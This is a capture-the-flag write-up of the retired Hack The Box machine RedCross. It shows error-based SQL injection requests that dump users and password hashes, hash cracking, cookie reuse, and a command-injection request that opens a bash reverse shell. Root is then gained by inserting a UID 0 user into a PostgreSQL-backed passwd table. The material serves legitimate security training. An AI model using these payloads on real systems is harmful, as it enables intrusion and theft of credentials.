# RedCross

This is the write-up for the box RedCross that got retired at the 13th April 2019.
My IP address was 10.10.14.6 while I did this.

Let's put this in our hosts file:
```
10.10.10.113    redcross.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/redcross.nmap 10.10.10.113
```

```
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u3 (protocol 2.0)
| ssh-hostkey:
|   2048 67:d3:85:f8:ee:b8:06:23:59:d7:75:8e:a2:37:d0:a6 (RSA)
|   256 89:b4:65:27:1f:93:72:1a:bc:e3:22:70:90:db:35:96 (ECDSA)
|_  256 66:bd:a1:1c:32:74:32:e2:e6:64:e8:a5:25:1b:4d:67 (ED25519)
80/tcp  open  http     Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
443/tcp open  ssl/http Apache httpd 2.4.25
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Did not follow redirect to https://intra.redcross.htb/
| ssl-cert: Subject: commonName=intra.redcross.htb/organizationName=Red Cross International/stateOrProvinceName=NY/countryName=US
| Not valid before: 2018-06-03T19:46:58
|_Not valid after:  2021-02-27T19:46:58
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: Host: redcross.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The web service on port 80 forwards to port 443 directly, so it can be ignored.
- As this is on a subdomain, we should search for more subdomains with **Gobuster**:
```
gobuster dns -d redcross.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

It finds _admin.redcross.htb_ that should be put into the _/etc/hosts_ file.

## Checking HTTPS (Port 443)

The web page wants to forward to the domain name _intra.redcross.htb_, that has to be put into the _/etc/hosts_ file to visit it successfully.
In the SSL certificate is an email address, that could be a potential username:
> penelope@redcross.htb

The title of the web page is _"RedCross Messaging Intranet"_ with a login form and it seems to be a custom developed website.

![RedCross Messaging Intranet](https://kyuu-ji.github.io/htb-write-up/redcross/redcross_web-1.png)

The current directory _?page=login_ is actually _index.php_ that includes other PHP files.
In this case the **Burpsuite Spider** found _/pages/actions.php_ and _index.php_ is also in this directory.

So all the features of the web page are in _/pages_:
- _/pages/login.php_
- _/pages/contact.php_
- _/pages/index.php_

Lets search for PHP files in _/pages_ with **Gobuster**:
```
gobuster -u https://intra.redcross.htb/pages dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -k
```

Found PHP files:
- _/contact.php_
- _/login.php_
- _/header.php_
- _/bottom.php_
- _/app.php_
- _/actions.php_

The PHP file _app.php_ is one that was not found before but browsing there is not working.
It is probably the application after successful login.

Searching for hidden directories:
```
gobuster -u https://intra.redcross.htb dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

Found directories:
- _/documentation_ (403 Forbidden)

Searching for hidden text and PDF files in _documentation_:
```
gobuster -u https://intra.redcross.htb/documentation dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x pdf,txt -k
```

Found PDF file:
- _/account-signup.pdf_

The PDF _/documentation/account-signup.pdf_ is signed by Penelope Harris from the IT department and it describes how to request an access to the intranet:
```
Intranet access request:
Please send a message using our intranet contact form: https://intra.redcross.htb/?page=contact
It’s very important that the subect of the message specifies that you are requesting "credentials" and also specify an username in the body of the message in the form:
"username=yourdesiredname"

It’s very important to follow this rules to get the account information as fast as possible, otherwise the message will be sent to our IT administrator who will take care if it when possible.
```

After requesting as it is described, it shows a message that contains temporary credentials as _guest:guest_ while my request is processed.
The credentials  of _guest_ work and logs us into the system:

![Login with guest](https://kyuu-ji.github.io/htb-write-up/redcross/redcross_web-2.png)

Input on the _UserID_ errors out when using a _single quote_ which means there is some kind of **SQL Injection** vulnerability in this function:
```
DEBUG INFO: You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '5' or dest like '1'') LIMIT 10' at line 1
```

### Exploiting SQL Injection Vulnerability

The SQL query that is sent, looks probably something like this:
```
select message from table where (message like '5' or dest like '<injection>') LIMIT 10'
```

By sending malicious SQL queries to the application, it is possible to force the error message to display information from the database.
This is called **Error-based SQL Injection** and can be abused with the `extractvalue` command.
```
GET /?o=') and extractvalue(0x0a,concat(0x0a,version()))-- -&page=app HTTP/1.1
Host: intra.redcross.htb
```

It responds with the version of the MariaDB installation, which proofs the SQL Injection is successful:
```
10.1.26-MariaDB-0+deb9u1
```

Getting information about the tables:
```
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select SCHEMA_NAME from INFORMATION_SCHEMA.SCHEMATA LIMIT 1,1)))--+-&page=app
```

There are two databases:
- _information_schema_
- _redcross_

Getting table names from the _redcross_ database:
```
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 0,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 1,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA like "redcross" LIMIT 2,1)))--+-&page=app
```

The table names are:
- _messages_
- _requests_
- _users_

Getting column names of the _users_ table:
```
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 0,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 1,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 2,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 3,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select COLUMN_NAME from INFORMATION_SCHEMA.COLUMNS where TABLE_NAME like "users" LIMIT 4,1)))--+-&page=app
```

The column names are:
- _id_
- _username_
- _password_
- _mail_
- _role_

Getting the usernames:
```
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 0,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 1,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 2,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 3,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select username from redcross.users LIMIT 4,1)))--+-&page=app
```

Usernames:
- _admin_
- _penelope_
- _charles_
- _tricia_
- _guest_

As the output is limited and password hashes in MySQL are longer, getting the passwords of the users will take two requests and the hashes have to be manually put together:
```
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 0,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 0,1) FROM 30)))--+-&page=app

GET /?o=')+and+extractvalue(0x0a,concat(0x0a,(select password from redcross.users LIMIT 1,1)))--+-&page=app
GET /?o=')+and+extractvalue(0x0a,concat(0x0a,substring((select password from redcross.users LIMIT 1,1) FROM 30)))--+-&page=app HTTP/1.1
(...)
```

- admin:$2y$10$z/d5GiwZuFqjY1jRiKIPzuPXKt0SthLOyU438ajqRBtrb7ZADpwq.
- penelope:$2y$10$tY9Y955kyFB37GnW4xrC0.J.FzmkrQhxD..vKCQICvwOEgwfxqgAS
- charles:$2y$10$bj5Qh0AbUM5wHeu/lTfjg.xPxjRQkqU6T8cs683Eus/Y89GHs.G7i
- tricia:$2y$10$Dnv/b2ZBca2O4cp0fsBbjeQ/0HnhvJ7WrC/ZN3K7QKqTa9SSKP6r.'
- guest:$2y$10$U16O2Ylt/uFtzlVbDIzJ8us9ts8f9ITWoPAWcUfK585sZue03YBAi'

Lets try cracking the hashes with **Hashcat**:
```
hashcat -m 3200 --username redcross.hash /usr/share/wordlists/rockyou.txt
```

The hash of _charles_ gets cracked and the password is:
> cookiemonster

With these credentials it is possible to login into the web page and there are some more messages.
The messages say, that there are problems with the _"Admin webpanel"_ which is the probably the subdomain _admin.redcross.htb_ found earlier.

### Exploiting admin.redcross.htb

On _admin.redcross.htb_ is a login form to the IT Admin panel:

![IT Admin panel](https://kyuu-ji.github.io/htb-write-up/redcross/redcross_web-3.png)

No found credentials work on the login page, but the password of _charles_ could be a hint to do something with **Cookies**.
By copying the current **PHPSESSID cookie** of _charles_ and using them on the _admin.redcross.htb_ page, it logs us in directly into the web panel.

There are two features on this admin panel:
- User Management
  - Allows to add an user
- Network Access
  - Allows to whitelist IP addresses

When creating a user, it automatically generates a password:
```
Provide this credentials to the user:
testuser : Z71Jb366
```

This user does not work on any of the web services but instead on SSH:
```
ssh testuser@10.10.10.113
```

The shell is very restricted, as it does not show default directories and also does not allow many commands, so lets look into the other feature.
The feature _Network Access_ allows to whitelist IP addresses and after sending mine, it shows that it runs `iptables` in the background:
```
DEBUG: All checks passed... Executing iptables Network access granted to 10.10.14.6 Network access granted to 10.10.14.6
```

The web request sends and ip, id and an action.
After trying to append commands to all parameters to get **command injection**, the action _deny_ and the parameter _ip_ allow executing system commands:
```
POST /pages/actions.php HTTP/1.1
(...)
ip=10.10.14.6;ping+-c+1+10.10.14.6&id=12&action=deny
```

That means we can run any system command and start a reverse shell:
```
ip=10.10.14.6;bash -i >& /dev/tcp/10.10.14.6/9001 0>&1&id=12&action=deny
```

After URL-encoding and sending the request, the listener on my IP and port 9001 starts a reverse shell session as _www-data_.

## Privilege Escalation

In the directory _/var/www/html/admin/pages_ is the file _actions.php_ that has credentials for a database:
```
$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
```

This is a **PostgreSQL database**:
```
psql -h 127.0.0.1 -U unixusrmgr unix
```

Showing the tables:
```
unix=> \d
```
```
public | group_id     | sequence | postgres
public | group_table  | table    | postgres
public | passwd_table | table    | postgres
public | shadow_table | table    | postgres
public | user_id      | sequence | postgres
public | usergroups   | table    | postgres
```

Information in _passwd_table_:
```
unix=> select * from passwd_table;
```
```
tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail/home | /bin/bash
testuser | $1$puhoF.8o$PuGXbL/B8pp/fZMjQSAaX0 | 2020 | 1001 |       | /var/jail/home | /bin/bash
```

Creating a new user:
```
INSERT INTO passwd_table (username, passwd, gid, homedir) values ('newuser', '$1$61vWy0S8$fDRliAv0Lnr6lf.z9qD1j1', 0, '/');
```

> The password hash was created with `openssl passwd -1 newpass123`

The new user is now able to SSH into the box:
```
ssh newuser@10.10.10.113
```

### Privilege Escalation to root

To get an attack surface, it is recommended to run any **Linux Enumeration Script**.

In the _/etc_ directory are different configuration files and when searching for passwords, the file _nss-pgsql-root.conf_ has a different user account to access the **PostgreSQL database**.
```
cat /etc/* | grep password
```
```
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
```

Login into the database:
```
psql -h 127.0.0.1 -U unixnssroot unix
```

This user has more permissions than the one before, so we can create a user with the _UID 0_:
```
INSERT INTO passwd_table (username, passwd, uid, gid, homedir) values ('rootuser', '$1$61vWy0S8$fDRliAv0Lnr6lf.z9qD1j1', 0, 0, '/');
```

It is possible to switch users to the newly created user:
```
su rootuser
```

This user has an UID of 0, which means it is a root user!
```
rootuser@redcross:/# id
uid=0(rootuser) gid=0(root) groups=0(root)
```
